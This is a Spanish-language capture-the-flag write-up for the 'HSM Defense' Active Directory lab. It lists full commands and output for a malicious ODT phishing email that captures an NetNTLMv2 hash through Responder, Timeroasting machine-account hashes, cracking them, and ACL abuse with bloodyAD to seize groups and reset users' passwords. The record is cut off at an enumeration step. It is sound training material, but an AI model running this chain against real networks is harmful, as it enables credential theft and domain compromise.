# Writeup: HSM Defense (HackSmarter — Difícil)

HSM Defense es una máquina **Difícil** que simula el entorno de un contratista de defensa con un Controlador de Dominio Active Directory. El recorrido comienza con un escenario de *Assumed Breach* donde se proporcionan credenciales de bajo privilegio, pero también puede resolverse desde una perspectiva *blackbox* sin credenciales. A través de la enumeración web, se descubre una oferta de trabajo que permite enviar currículums en formato ODT, lo que se explota mediante un documento malicioso para capturar un hash NetNTLMv2. Tras crackear la contraseña, se accede a un panel de soporte donde se encuentran tickets que revelan información crítica sobre cuentas de máquina y configuraciones de Active Directory. A través de un ataque de **Timeroasting**, se obtienen hashes de cuentas de equipo, y mediante una cadena de abusos de ACLs (WriteOwner, GenericAll, ForceChangePassword, WriteDACL), se comprometen progresivamente los usuarios `jason.caldwell`, `luke.harrison`, `caleb.turner`, `oscar.mazerath`, `ryan.cole`, `ITOPS01$`, `svc_delegate` y `HELPDESK01$`. Finalmente, se configura una **delegación restringida Kerberos con transición de protocolo** para realizar un **DCSync** y obtener el hash del Administrador del dominio.

---

## Fase 1: Reconocimiento

Realizamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 10.0.20.80 -oG allPorts
```

**Resultado:**

```
PORT      STATE SERVICE          REASON
25/tcp    open  smtp             syn-ack ttl 126
53/tcp    open  domain           syn-ack ttl 126
80/tcp    open  http             syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
110/tcp   open  pop3             syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
143/tcp   open  imap             syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
587/tcp   open  submission       syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
5985/tcp  open  wsman            syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
47001/tcp open  winrm            syn-ack ttl 126
49664/tcp open  unknown          syn-ack ttl 126
49665/tcp open  unknown          syn-ack ttl 126
49666/tcp open  unknown          syn-ack ttl 126
49668/tcp open  unknown          syn-ack ttl 126
49669/tcp open  unknown          syn-ack ttl 126
49670/tcp open  unknown          syn-ack ttl 126
49671/tcp open  unknown          syn-ack ttl 126
49672/tcp open  unknown          syn-ack ttl 126
49694/tcp open  unknown          syn-ack ttl 126
49725/tcp open  unknown          syn-ack ttl 126
```

Usamos `extractPorts` para extraer los puertos abiertos:

```bash
extractPorts allPorts
```

**Resultado:**

```
[*] Extrayendo información...

        [*] Dirección IP: 10.0.20.80
        [*] Puertos abiertos: 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49672,49694,49725

[*] Puertos copiados al portapapeles
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sCV -p 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49672,49694,49725 10.0.20.80 -oN targeted
```

**Resultados clave:**

```
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Office Careers | HSM Defense
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 23:57:46Z)
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: completed NAMESPACE IMAP4 ACL IDLE CAPABILITY OK SORT RIGHTS=texkA0001 CHILDREN QUOTA IMAP4rev1
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-21T23:58:53+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.hsm-defense.local
| Not valid before: 2026-08-31T17:16:05
|_Not valid after:  2027-03-02T17:16:05
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-21T23:58:44
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

**Observaciones clave:**

- **Dominio**: `hsm-defense.local`
- **Controlador de Dominio**: `DC.hsm-defense.local`
- **Servicios AD típicos**: DNS, Kerberos, LDAP, SMB, RDP, WinRM.
- **Servidor de correo**: hMailServer en los puertos 25, 110, 143, 587.

Como la máquina permite realizar el CTF como una caja negra, lo haremos de esa forma.

---

## Fase 2: Enumeración inicial

### 2.1 Verificación de acceso anónimo

```bash
nxc smb DC.hsm-defense.local -u 'guest' -p '' --shares
```

**Resultado:**

```
SMB         10.0.20.80      445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.0.20.80      445    DC               [-] hsm-defense.local\guest: STATUS_NOT_SUPPORTED
```

**Explicación del error:** `STATUS_NOT_SUPPORTED` indica que el servidor **no soporta NTLM** (está deshabilitado). Debemos usar Kerberos.

```bash
nxc smb DC.hsm-defense.local -u 'guest' -p '' --shares -k
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [-] hsm-defense.local\guest: KDC_ERR_CLIENT_REVOKED
```

**Explicación del error:** `KDC_ERR_CLIENT_REVOKED` indica que la cuenta está deshabilitada o bloqueada.

### 2.2 Enumeración del sitio web (puerto 80)

En la página web que corre en el puerto 80, en la sección donde se muestran los puestos de trabajo, al presionar el botón para ver más detalles, encontramos un correo interesante al final:

```
Kelly Johnson
Senior HR Manager
📧 kelly.johnson@hsm-defense.local

For questions about this position, please contact Kelly directly.
```

### 2.3 Enumeración de subdominios

```bash
ffuf -u http://hsm-defense.local -H "Host: FUZZ.hsm-defense.local" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 63852
```

**Resultado:**

```
support                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 1359ms]
```

Encontramos el subdominio **`support.hsm-defense.local`**, que devuelve un **401 Unauthorized** con autenticación básica.

```bash
GET / HTTP/1.1
Host: support.hsm-defense.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Authorization: Basic YWRtaW46YWRtaW4=
```

**Resultado:**

```
HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Basic realm="support.hsm-defense.local"
Date: Mon, 28 Sep 2026 21:56:19 GMT
Content-Length: 1293
```

Las credenciales `admin:admin` no funcionan.

---

## Fase 3: Documento ODT malicioso (NetNTLMv2 Capture)

### 3.1 Análisis de la página principal

Volviendo a la página principal del sitio web, encontramos información sobre cómo aplicar a un puesto:

```
### 📋 How to apply

Send your CV, cover letter and references as a LibreOffice document (.odt) to:

careers@hsm-defense.local
```

Podemos aplicar enviando un currículum en formato ODT o ODP. Esto abre la posibilidad de establecer una reverse shell mediante un documento con macro o uno que, al abrirse, establezca una conexión insegura a un recurso compartido de red externo para interceptar hashes NetNTLM.

### 3.2 Preparación del documento ODT con Metasploit

```bash
msfconsole -q
```

Buscamos módulos relacionados con ODT:

```bash
msf > search odt
```

**Resultado:**

```
Matching Modules
================

   #  Full Name                                        Disclosure Date  Rank     Check  Name
   -  ---------                                        ---------------  ----     -----  ----
   0  exploit/windows/telnet/goodtech_telnet           2005-03-15       average  No     GoodTech Telnet Server Buffer Overflow
   1    \_ target: Windows 2000 Pro English All        .                .        .      .
   2    \_ target: Windows XP Pro SP0/SP1 English      .                .        .      .
   3  auxiliary/fileformat/odt_badodt                  2018-05-01       normal   No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
   4  exploit/multi/fileformat/libreoffice_macro_exec  2018-10-18       normal   No     LibreOffice Macro Code Execution
   5    \_ target: Windows                             .                .        .      .
   6    \_ target: Linux                               .                .        .      .
   7  exploit/multi/fileformat/libreoffice_logo_exec   2019-07-16       normal   No     LibreOffice Macro Python Code Execution
```

Usamos el módulo 3:

```bash
msf > use 3
msf auxiliary(fileformat/odt_badodt) > options
```

**Resultado:**

```
Module options (auxiliary/fileformat/odt_badodt):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CREATOR   RD_PENTEST       yes       Document author for new document
   FILENAME  bad.odt          yes       Filename for the new document
   LHOST                      yes       IP Address of SMB Listener that the .odt document points to
```

Configuramos el `LHOST` y ejecutamos:

```bash
msf auxiliary(fileformat/odt_badodt) > set LHOST tun0
LHOST => 10.200.97.239
msf auxiliary(fileformat/odt_badodt) > run
```

**Resultado (primer intento con error):**

```
[*] Generating Malicious ODT File 
[*] SMB Listener Address will be set to 10.200.97.239
[-] Auxiliary failed: Errno::EACCES Permission denied @ rb_sysopen - /usr/share/metasploit-framework/data/exploits/badodt/content.xml
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/auxiliary/fileformat/odt_badodt.rb:56:in `initialize'
[-]   /usr/share/metasploit-framework/modules/auxiliary/fileformat/odt_badodt.rb:56:in `open'
[-]   /usr/share/metasploit-framework/modules/auxiliary/fileformat/odt_badodt.rb:56:in `createfilecontent'
[-]   /usr/share/metasploit-framework/modules/auxiliary/fileformat/odt_badodt.rb:40:in `run'
[*] Auxiliary module execution completed
```

**Explicación del error:** `msfconsole` no pudo abrir `content.xml` por **permisos del sistema de archivos**. Esa ruta está bajo `/usr/share/metasploit-framework/` — propiedad de **root**. Salimos de `msfconsole` y volvemos a entrar usando `sudo`.

```bash
sudo msfconsole -q
```

Volvemos a ejecutar el módulo:

```bash
msf > use 3
msf auxiliary(fileformat/odt_badodt) > set LHOST tun0
LHOST => 10.200.97.239
msf auxiliary(fileformat/odt_badodt) > run
```

**Resultado (con sudo):**

```
[*] Generating Malicious ODT File 
[*] SMB Listener Address will be set to 10.200.97.239
[+] bad.odt stored at /root/.msf4/local/bad.odt
[*] Auxiliary module execution completed
```

Verificamos el archivo generado:

```bash
ls
bad.odt
```

### 3.3 Iniciando Responder para capturar el hash

Antes de enviar el correo, iniciamos **Responder** en nuestra interfaz de red:

```bash
sudo responder -I tun0 -v
```

### 3.4 Envío del correo con el ODT malicioso

Usamos `swaks` para enviar el correo con el archivo adjunto:

```bash
swaks --to 'careers@hsm-defense.local' \
  --from 'kali@candidate.com' \
  --header 'Subject: Job Application no1' \
  --body 'Dear Hiring Team,
Please find attached my application for the position. I look forward to hearing from you.
Kind regards, kali' \
  --attach-type application/octet-stream \
  --server DC.hsm-defense.local \
  --port 25 \
  --timeout 20s \
  --attach @bad.odt
```

**Resultado en Responder:**

```
[SMB] NTLMv2-SSP Client   : 10.0.20.80
[SMB] NTLMv2-SSP Username : HSMDEFENSE\kelly.johnson
[SMB] NTLMv2-SSP Hash     : kelly.johnson::HSMDEFENSE:e00144f9573c5302:7F04A4E5B147C1336504DFCB93016E10:010100000000000000D91A187A4FDD010ABD0AA54EAC6C7E00000000020008004B0048005400440001001E00570049004E002D004D00590051003600420032004C0038004F003300440004003400570049004E002D004D00590051003600420032004C0038004F00330044002E004B004800540044002E004C004F00430041004C00030014004B004800540044002E004C004F00430041004C00050014004B004800540044002E004C004F00430041004C000700080000D91A187A4FDD0106000400020000000800300030000000000000000100000000200000C8FEB9EC97DCA4088915E5FBF9E355A4871967E987EF0CFE1D9B16436366D4D40A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00390037002E003200330039000000000000000000
```

Capturamos el hash NetNTLMv2 del usuario `kelly.johnson`.

### 3.5 Crackeo del hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
```

**Resultado:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Lordofwar        (kelly.johnson)     
1g 0:00:00:09 DONE (2026-09-28 19:26) 0.1103g/s 1203Kp/s 1203Kc/s 1203KC/s Loveyousheriden..Londres24
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

La contraseña es **`Lordofwar`**, la misma que se nos proporcionó inicialmente.

---

## Fase 4: Acceso autenticado y enumeración

### 4.1 Verificación de credenciales

```bash
nxc smb DC.hsm-defense.local -u 'kelly.johnson' -p 'Lordofwar' --shares
```

**Resultado:**

```
SMB         10.0.20.80      445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.0.20.80      445    DC               [-] hsm-defense.local\kelly.johnson:Lordofwar STATUS_NOT_SUPPORTED
```

**Explicación del error:** `STATUS_NOT_SUPPORTED` de nuevo — NTLM está deshabilitado.

```bash
nxc smb DC.hsm-defense.local -u 'kelly.johnson' -p 'Lordofwar' --shares -k
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark 
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------ 
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share 
```

### 4.2 Obtención de TGT

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
impacket-GetUserSPNs hsm-defense.local/kelly.johnson@DC.hsm-defense.local \
  -k -no-pass -request -dc-host DC.hsm-defense.local
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

No hay cuentas de servicio con SPN configurado (no hay Kerberoasting directo).

### 4.3 Enumeración de usuarios con rpcclient

```bash
rpcclient DC.hsm-defense.local -k -U 'kelly.johnson%Lordofwar'
```

**Resultado:**

```
WARNING: The option -k|--kerberos is deprecated!
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[kelly.johnson] rid:[0x450]
user:[luke.harrison] rid:[0x452]
user:[ethan.mercer] rid:[0x453]
user:[aaron.pierce] rid:[0x456]
user:[nathan.reed] rid:[0x457]
user:[caleb.turner] rid:[0x458]
user:[adam.brooks] rid:[0x459]
user:[oscar.mazerath] rid:[0x45b]
user:[evan.carter] rid:[0x45d]
user:[dylan.foster] rid:[0x45e]
user:[ryan.cole] rid:[0x45f]
user:[svc_delegate] rid:[0x463]
user:[jason.caldwell] rid:[0x464]
user:[james.carter] rid:[0x467]
user:[oliver.bennett] rid:[0x468]
user:[ethan.hughes] rid:[0x469]
user:[lucas.turner] rid:[0x46a]
user:[daniel.mitchell] rid:[0x46b]
user:[mason.bradley] rid:[0x46d]
user:[logan.shepherd] rid:[0x46e]
user:[noah.prescott] rid:[0x46f]
user:[aiden.fletcher] rid:[0x470]
user:[connor.bishop] rid:[0x471]
user:[zachary.holden] rid:[0x472]
```

Guardamos la lista en `users.txt`:

```bash
rpcclient DC.hsm-defense.local -k -U 'kelly.johnson%Lordofwar' -c 'enumdomusers' \
  | cut -d'[' -f2 | cut -d']' -f1 | grep -v '^$' > users.txt
```

### 4.4 Intento de Password Spraying (fallido)

Password spraying fallo.

### 4.5 Enumeración LDAP

```bash
ldapsearch -x -H ldap://DC.hsm-defense.local \
  -D 'kelly.johnson@hsm-defense.local' -w 'Lordofwar' \
  -b 'DC=hsm-defense,DC=local' -LLL \
  '(objectCategory=person)' sAMAccountName description
```

No encontre informacion importante.

### 4.6 Enumeración con BloodHound

```bash
rusthound-ce -d hsm-defense.local -u kelly.johnson -p 'Lordofwar' \
  -k -f DC.hsm-defense.local -i 10.0.20.80 -z
```

No encontre informacion importante.

---

## Fase 5: Acceso al panel de soporte y descubrimiento de tickets

Vamos al dominio `support.hsm-defense.local` y usamos las credenciales de `kelly.johnson`. **Funcionó.**

![Dashboard de tickets de soporte](./hsm-support-dashboard.png)

### TICKET-2417: Machine account HELPDESK01$ password config reset

```
oscar.mazerath · 2025-03-07 09:47 · priority: high · status: resolved · category: active directory / security

During a recent review I noticed that my predecessor changed the password configuration of the machine account HELPDESK01$ from automatic management to a manually set password. This was apparently done to simplify administrative access during troubleshooting.

However, leaving a machine account password configured manually introduces unnecessary security risk and does not follow our standard domain security policies.

Please reset the password configuration of HELPDESK01$ so that it is managed automatically by the domain again.

Thank you.

Best regards,
Oscar Mazerath

NOTE: request referred by luke.harrison: confirm removal of static pwd.
```

**Hallazgo crítico:** La cuenta de máquina `HELPDESK01$` tiene una contraseña configurada manualmente, lo que la convierte en un objetivo valioso.

En BloodHound, podemos ver que la cuenta de máquina `HELPDESK01$` podría ser un objetivo valioso, ya que tiene permisos `WriteOwner` sobre el grupo `servicedesk`. Específicamente, una vez que obtengamos las credenciales de `HELPDESK01$`, podemos establecerlo como propietario del grupo `servicedesk`, otorgarnos `GenericAll` sobre el grupo y luego agregar un usuario que controlemos al grupo, obteniendo así todos los permisos del grupo `servicedesk`.

---

## Fase 6: Timeroasting

Realizaremos el siguiente ataque:

> **Timeroasting** es una técnica de ataque que abusa de la extensión propietaria de Microsoft para NTP con el fin de extraer hashes equivalentes a contraseñas de cuentas de equipo y de confianza desde controladores de dominio sin requerir autenticación. Estos hashes pueden posteriormente ser crackeados offline.
>
> Los equipos unidos al dominio sincronizan sus relojes del sistema usando NTP, con los controladores de dominio actuando como fuentes de tiempo autoritativas. Para solventar la falta de autenticación de NTP, Microsoft implementó una extensión personalizada que autentica criptográficamente las respuestas NTP usando las credenciales de la cuenta de equipo.
>
> Cuando un equipo solicita sincronización de tiempo, incluye el RID (Relative Identifier) de su cuenta de equipo en la solicitud NTP. El controlador de dominio responde con un Message Authentication Code (MAC) calculado usando el hash NTLM de la cuenta de equipo como clave. Este diseño permite a clientes no autenticados solicitar hashes de contraseñas saltados para cualquier cuenta de equipo del dominio especificando diferentes valores de RID.

```bash
nxc smb DC.hsm-defense.local -u 'kelly.johnson' -p 'Lordofwar' -k -M timeroast
```

**Resultado:**

```
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar 
TIMEROAST   DC.hsm-defense.local 445    DC               [*] Starting Timeroasting...
TIMEROAST   DC.hsm-defense.local 445    DC               1000:$sntp-ms$0b3624e5edc1091f4ec4d0085ae315dc$1c0111e900000000000a00734c4f434cee65a5c45e37de93e1b8428bffbfcd0aee65a65cee16f006ee65a65cee1734cf
TIMEROAST   DC.hsm-defense.local 445    DC               1105:$sntp-ms$b1f8da502c724250e557b78aba38eecc$1c0111e900000000000a00744c4f434cee65a5c45b221350e1b8428bffbfcd0aee65a65dbb21eb0cee65a65dbb22291f
TIMEROAST   DC.hsm-defense.local 445    DC               1122:$sntp-ms$671c942a170a9b3cd24e2c268e4a820e$1c0111e900000000000a00744c4f434cee65a5c45df3c55fe1b8428bffbfcd0aee65a65dddf39b6dee65a65dddf3d981
```

Crackeamos los hashes con `hashcat` (modo 31300):

```bash
hashcat -m 31300 sntp.hash /usr/share/wordlists/rockyou.txt
```

**Resultado:**

```
$sntp-ms$b1f8da502c724250e557b78aba38eecc$1c0111e900000000000a00744c4f434cee65a5c45b221350e1b8428bffbfcd0aee65a65dbb21eb0cee65a65dbb22291f:Password123
```

**Hallazgo crítico:** La cuenta de máquina `HELPDESK01$` tiene la contraseña `Password123`.

Verificamos las credenciales:

```bash
nxc smb DC.hsm-defense.local -u 'HELPDESK01$' -p 'Password123' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\HELPDESK01$:Password123 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

Ahora controlamos la cuenta de máquina `HELPDESK01$`.

---

## Fase 7: Abuso de WriteOwner sobre el grupo servicedesk

Echemos un vistazo más de cerca a los datos de BloodHound y veamos que podemos cambiar las contraseñas de las cuentas `jason.caldwell`, `ethan.mercer` y `luke.harrison` a través del grupo de service desk. Por lo tanto, podemos tomar el control de estas cuentas.

El usuario `jason.caldwell` es particularmente interesante porque es miembro del grupo `remote management users`, lo que nos permite obtener una sesión interactiva en el controlador de dominio. Sin embargo, también sabemos por los tickets de soporte que este usuario puede haber configurado incorrectamente las horas de inicio de sesión (*logon hours*), y es posible que no podamos autenticarnos con esa cuenta.

Además, el usuario `luke.harrison` también es de interés porque es miembro del grupo `account administration`; es posible que tengamos permisos adicionales a través de este grupo, pero no los vemos directamente en nuestros datos de BloodHound.

Seguimos la ruta analizada a partir de nuestros datos de BloodHound y tomamos el control del grupo de service desk para ganar control sobre el usuario `jason.caldwell` y, con ello, establecer una sesión remota en el DC.

Así que establecemos la cuenta de máquina `HELPDESK01$` como propietaria del grupo `servicedesk`, nos concedemos `GenericAll` sobre el grupo y luego añadimos al grupo un usuario que controlamos, obteniendo así todos los permisos del grupo `servicedesk`. Después de eso, cambiamos la contraseña de los usuarios que elijamos.

### WriteOwner → cambiar el propietario a nosotros mismos

Cambiamos la propiedad del objeto de Active Directory objetivo `servicedesk` a nuestra cuenta de máquina controlada `HELPDESK01$`, para así obtener control total sobre él.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' set owner 'servicedesk' 'HELPDESK01$'
```

**Resultado:**

```
[+] Old owner S-1-5-21-1508256018-1502282808-1859300581-512 is now replaced by HELPDESK01$ on servicedesk
```

### Grant us GenericAll over the Group

Otorgamos a la cuenta `HELPDESK01$` permisos `GenericAll` sobre el grupo objetivo `servicedesk`, dándonos control total sobre el objeto y sus atributos.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' add genericAll 'servicedesk' 'HELPDESK01$'
```

**Resultado:**

```
[+] HELPDESK01$ has now GenericAll on servicedesk
```

### AddMember: Añadir HELPDESK01$ al grupo

Añadimos la cuenta `HELPDESK01$` como miembro del grupo `servicedesk` para heredar sus privilegios.

Este abuso se puede llevar a cabo cuando se controla un objeto que tiene `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights` o `Self-Membership`, sobre el grupo objetivo.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' add groupMember 'servicedesk' 'HELPDESK01$'
```

**Resultado:**

```
[+] HELPDESK01$ added to servicedesk
```

### ForceChangePassword

Reseteamos la contraseña de la cuenta `jason.caldwell` a un valor conocido, permitiéndonos autenticarnos como ese usuario.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' set password jason.caldwell 'K@li1234!'
```

**Resultado:**

```
[+] Password changed successfully!
```

Verificamos las credenciales:

```bash
nxc smb DC.hsm-defense.local -u 'jason.caldwell' -p 'K@li1234!' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [-] hsm-defense.local\jason.caldwell:K@li1234! KDC_ERR_CLIENT_REVOKED
```

Probamos las credenciales usando NetExec y no podemos autenticarnos, obtenemos el error `KDC_ERR_CLIENT_REVOKED`. Como se menciona en el ticket nº `2422`. Así que veamos si podemos ajustar las horas de inicio de sesión.

### TICKET-2422: Cannot log in - KDC_ERR_CLIENT_REVOKED

```
jason.caldwell · 2025-03-08 08:23 · priority: critical · status: urgent · category: active directory / logon hours

User jason.caldwell reports being unable to log into his account. Error message: KDC_ERR_CLIENT_REVOKED.

He suspects that his logon hours may be misconfigured, possibly set to "none allowed". The account was recently modified by the previous support engineer. Please review logonHours attribute and reset to default (always allowed) or correct restriction. Immediate assistance required.
```

---

## Fase 8: Acceso como luke.harrison

Intentamos obtener acceso como `luke.harrison`. El grupo `account administration` se ve muy prometedor.

Reseteamos la contraseña de la cuenta `luke.harrison` a un valor conocido, permitiéndonos autenticarnos como ese usuario.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' set password luke.harrison 'K@li1234!'
```

**Resultado:**

```
[+] Password changed successfully!
```

Verificamos las credenciales:

```bash
nxc smb DC.hsm-defense.local -u 'luke.harrison' -p 'K@li1234!' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\luke.harrison:K@li1234! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

Enumeramos los objetos escribibles para identificar una ruta alternativa que no esté cubierta en los datos de BloodHound. El usuario `luke.harrison` tiene permisos de escritura sobre el usuario `jason.caldwell`, lo que significa que podemos modificar los atributos de ese usuario. Bingo, podríamos ser capaces de arreglar las `logonHours`.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' -p 'K@li1234!' get writable
```

**Resultado:**

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: CN=Luke Harrison,CN=Users,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: DC=hsm-defense.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hsm-defense,DC=local
permission: CREATE_CHILD

